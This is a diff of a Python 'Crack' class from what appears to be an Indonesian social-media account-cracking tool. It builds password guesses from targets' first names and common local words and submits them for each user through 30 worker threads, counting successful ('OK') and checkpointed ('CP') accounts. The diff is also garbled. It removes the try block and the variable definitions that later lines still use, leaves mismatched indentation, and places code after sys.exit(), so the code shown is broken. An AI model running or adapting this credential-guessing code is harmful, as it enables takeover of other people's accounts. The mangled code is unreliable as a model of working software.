@@ -249,23 +249,7 @@ class Crack:
 			with ThreadPoolExecutor(max_workers=30) as fall:
 				self.simpan_hasil()
 				for data in tampung:
-					try:
-						pwx = []
-						user = data.split("<=>")[0]
-						nama = data.split("<=>")[1]
-						depan = nama.split(" ")[0]
-						if len(nama)<=5:
-							if len(depan)<3:
-								pass 
-							else:
-								pwx.append(depan+"123")
-								pwx.append(depan+"321")
-								pwx.append(depan+"1234")
-								pwx.append(depan+"12345")
-								pwx.append("ganteng")
-								pwx.append("sayangku")
-								pwx.append("ganteng123")
-								pwx.append("katasandi")
+						pwx.append("katasandi")
 								pwx.append("pekalongan")
 								pwx.append("semarang")
 						else:
@@ -302,6 +286,11 @@ class Crack:
 								pwx.append("batang")
 								pwx.append("pemalang")
 								pwx.append("paninggaran")
+						fall.submit(self.metode_api,user,pwx)
+					except:
+						fall.submit(self.metode_api,user,pwx)
+		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
+		sys.exit()
 					if "api" in self.mtd:
 						fall.submit(self.metode_api,user,pwx)
 					elif "mbasic" in self.mtd:
